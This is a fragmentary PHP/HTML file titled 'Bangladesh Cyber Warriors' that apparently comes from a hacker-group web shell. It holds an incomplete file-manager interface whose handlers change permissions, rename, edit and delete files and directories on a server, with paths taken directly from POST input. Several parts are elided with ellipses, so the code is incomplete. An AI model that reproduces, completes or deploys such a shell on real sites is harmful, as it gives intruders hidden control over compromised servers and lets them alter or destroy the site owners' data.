...
<HTML>
<HEAD>
<title>Bangladesh Cyber Warriors</title>
<style>
...
echo '<font color="red">Chmod Fail..</font><br />';
}
}
...
echo '<font color="red">Rename Fail..</font><br />';
}
...
echo '<font color="red">Edit File Fail..</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
...
echo '<font color="red">Delete Directory Fail..</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Success..</font><br />';
}else{
echo '<font color="red">Delete File Fail..</font><br />';
}
}
}
echo '</center>';
